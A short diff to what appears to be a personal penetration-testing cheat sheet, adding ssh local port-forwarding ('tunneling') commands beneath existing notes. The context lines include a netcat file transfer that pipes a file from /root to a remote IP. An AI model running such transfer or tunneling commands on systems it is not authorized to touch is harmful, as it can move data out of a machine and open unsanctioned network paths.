@@ -1002,6 +1002,9 @@ nc -l -p 8888 > try.txt
 cat '/root/try.txt' | nc 10.10.10.10 8888
 
 ssh tunneling
+ssh -L localport:remoteip:port root@remoteip
+safe way: 
+ssh -nNT -L 9900:localhost:9900 root@remoteip
 
 
 
